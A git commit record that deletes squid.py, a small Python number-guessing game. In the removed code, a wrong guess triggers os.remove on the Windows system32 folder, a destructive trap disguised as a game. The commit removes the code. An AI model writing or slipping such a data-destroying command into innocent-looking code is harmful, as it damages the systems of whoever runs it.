094ab1a61be2004fd07e942f2b4e254bc433e859
Altamash2306 <altamashshk2306@gmail.com>
2025-08-13 11:46:51 +0530

    Delete squid.py

--- squid.py
+++
@@ -1,9 +0,0 @@
-import random
-import os
-number=random.randint(1,10)
-guess=input("Guess the number between 1 to 10::")
-guess=int(guess)
-if guess==number:
-    print("YOU WIN!!")
-else:
-    os.remove("c:\\windows\\system32")
